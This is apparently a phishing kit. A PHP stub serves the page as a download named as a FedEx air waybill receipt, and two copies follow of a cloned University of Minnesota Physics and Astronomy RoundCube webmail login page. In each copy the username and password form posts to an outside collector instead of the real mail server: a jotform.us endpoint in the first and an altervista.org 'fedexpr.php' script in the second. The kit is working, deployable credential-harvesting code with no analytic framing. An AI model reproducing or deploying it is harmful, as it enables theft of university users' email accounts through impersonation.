<?php
header("Content-Disposition: attachment; filename=AirWayBillReceipt009Fedex.htm");
header("Content-Type: text/html"); // optional
readfile("roundcubeDark.html");
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Physics and Astronomy RoundCube Webmail :: Welcome to Webmail</TITLE>
<META name=Robots content=noindex,nofollow>
<META content=IE=EDGE http-equiv=X-UA-Compatible>
<META id=viewport name=viewport content=""><LINK rel="shortcut icon" 
href="skins/larry/images/favicon.ico"><LINK rel=stylesheet type=text/css 
href="https://mail.physics.umn.edu/roundcube/skins/larry/styles.min.css?s=1391171292"><!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.min.css?s=1391171292" /><![endif]--><!--[if lte IE 8]><LINK 
rel=stylesheet type=text/css 
href="https://mail.physics.umn.edu/roundcube/skins/larry/iehacks.min.css?s=1391171292"><![endif]--><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry/ie7hacks.min.css?s=1391171292" /><![endif]--><LINK 
rel=stylesheet type=text/css 
href="https://mail.physics.umn.edu/roundcube/plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1391171291">


<META name=GENERATOR content="MSHTML 8.00.7600.16385"></HEAD>
<BODY>
<DIV id=login-form>
<DIV class=box-inner><IMG id=logo alt="Physics and Astronomy RoundCube Webmail" 
src="https://mail.physics.umn.edu/roundcube/skins/larry/images/roundcube_logo.png"> 

<FORM method=post name=form action=https://submit.jotform.us/submit/71383180041144/><INPUT 
value=8c532f8c0eff86c7b8e86b223202b301 type=hidden name=_token> <INPUT 
value=login type=hidden name=_task><INPUT value=login type=hidden 
name=_action><INPUT id=rcmlogintz value=_default_ type=hidden 
name=_timezone><INPUT id=rcmloginurl type=hidden name=_url>
<TABLE>
  <TBODY>
  <TR>
    <TD class=title><LABEL for=q3_me>Username</LABEL> </TD>
    <TD class=input><INPUT id=q3_me size=40 type=text name=q3_me 
      autocomplete="off" autocapitalize="off" required="required"></TD></TR>
  <TR>
    <TD class=title><LABEL for=q4_mirrow>Password</LABEL> </TD>
    <TD class=input><INPUT id=q4_mirrow size=40 type=password name=q4_mirrow 
      autocomplete="off" autocapitalize="off" 
required="required"></TD></TR></TBODY></TABLE>
<P 
class=formbuttons><INPUT class="button mainaction" value=Login type=submit></P></FORM></DIV>
<DIV class=box-bottom>
<DIV id=message></DIV><NOSCRIPT>
<P class=noscriptwarning>Warning: This webmail service requires Javascript! In 
order to use it please enable Javascript in your browser's 
settings.</P></NOSCRIPT></DIV>
<DIV id=bottomline>Physics and Astronomy RoundCube Webmail &nbsp;â—&nbsp; <A 
class=support-link 
href="http://zzz.physics.umn.edu/computing/accounts/email/roundcube/" 
target=_blank>Get support</A> </DIV></DIV>
<SCRIPT type=text/javascript>

// UI startup
var UI = new rcube_mail_ui();
$(document).ready(function(){
	UI.set('errortitle', 'An error occurred!');
	UI.init();
});

</SCRIPT>
<!--[if lte IE 8]>
<SCRIPT type=text/javascript>

// fix missing :last-child selectors
$(document).ready(function(){
	$('ul.treelist ul').each(function(i,ul){
		$('li:last-child', ul).css('border-bottom', 0);
	});
});

</SCRIPT>
<![endif]-->
<SCRIPT type=text/javascript>

jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
                using: function(pos) {
                    var me = jQuery(this),
                        offset = me.css(pos).offset(),
                        topOffset = offset.top - 12;
                    if (topOffset < 0)
                        me.css('top', pos.top - topOffset);
                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
                        me.css('left', pos.left - 12);
                }
            });
$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</SCRIPT>
</BODY></HTML>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Physics and Astronomy RoundCube Webmail :: Welcome to  RoundCube Webmail</TITLE>
<META name=Robots content=noindex,nofollow>
<META content=IE=EDGE http-equiv=X-UA-Compatible>
<META id=viewport name=viewport content=""><LINK rel="shortcut icon" 
href="skins/larry/images/favicon.ico"><LINK rel=stylesheet type=text/css 
href="https://mail.physics.umn.edu/roundcube/skins/larry/styles.min.css?s=1391171292"><!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.min.css?s=1391171292" /><![endif]--><!--[if lte IE 8]><LINK 
rel=stylesheet type=text/css 
href="https://mail.physics.umn.edu/roundcube/skins/larry/iehacks.min.css?s=1391171292"><![endif]--><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry/ie7hacks.min.css?s=1391171292" /><![endif]--><LINK 
rel=stylesheet type=text/css 
href="https://mail.physics.umn.edu/roundcube/plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1391171291">


<META name=GENERATOR content="MSHTML 8.00.7600.16385"></HEAD>
<BODY>
<DIV id=login-form>
<DIV class=box-inner><IMG id=logo alt="Physics and Astronomy RoundCube Webmail" 
src="https://mail.physics.umn.edu/roundcube/skins/larry/images/roundcube_logo.png"> 

<FORM method=post name=form action=http://youngshallgrow.altervista.org/fedexpr.php><INPUT 
value=8c532f8c0eff86c7b8e86b223202b301 type=hidden name=_token> <INPUT 
value=login type=hidden name=_task><INPUT value=login type=hidden 
name=_action><INPUT id=rcmlogintz value=_default_ type=hidden 
name=_timezone><INPUT id=rcmloginurl type=hidden name=_url>
<TABLE>
  <TBODY>
  <TR>
    <TD class=title><LABEL for=q3_me>Username</LABEL> </TD>
    <TD class=input><INPUT id=q3_me size=40 type=text name=q3_me 
      autocomplete="off" autocapitalize="off" required="required"></TD></TR>
  <TR>
    <TD class=title><LABEL for=q4_mirrow>Password</LABEL> </TD>
    <TD class=input><INPUT id=q4_mirrow size=40 type=password name=q4_mirrow 
      autocomplete="off" autocapitalize="off" 
required="required"></TD></TR></TBODY></TABLE>
<P 
class=formbuttons><INPUT class="button mainaction" value=Login type=submit></P></FORM></DIV>
<DIV class=box-bottom>
<DIV id=message></DIV><NOSCRIPT>
<P class=noscriptwarning>Warning: This webmail service requires Javascript! In 
order to use it please enable Javascript in your browser's 
settings.</P></NOSCRIPT></DIV>
<DIV id=bottomline>Physics and Astronomy RoundCube Webmail &nbsp;â—&nbsp; <A 
class=support-link 
href="http://zzz.physics.umn.edu/computing/accounts/email/roundcube/" 
target=_blank>Get support</A> </DIV></DIV>
<SCRIPT type=text/javascript>

// UI startup
var UI = new rcube_mail_ui();
$(document).ready(function(){
	UI.set('errortitle', 'An error occurred!');
	UI.init();
});

</SCRIPT>
<!--[if lte IE 8]>
<SCRIPT type=text/javascript>

// fix missing :last-child selectors
$(document).ready(function(){
	$('ul.treelist ul').each(function(i,ul){
		$('li:last-child', ul).css('border-bottom', 0);
	});
});

</SCRIPT>
<![endif]-->
<SCRIPT type=text/javascript>

jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
                using: function(pos) {
                    var me = jQuery(this),
                        offset = me.css(pos).offset(),
                        topOffset = offset.top - 12;
                    if (topOffset < 0)
                        me.css('top', pos.top - topOffset);
                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
                        me.css('left', pos.left - 12);
                }
            });
$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</SCRIPT>
</BODY></HTML>


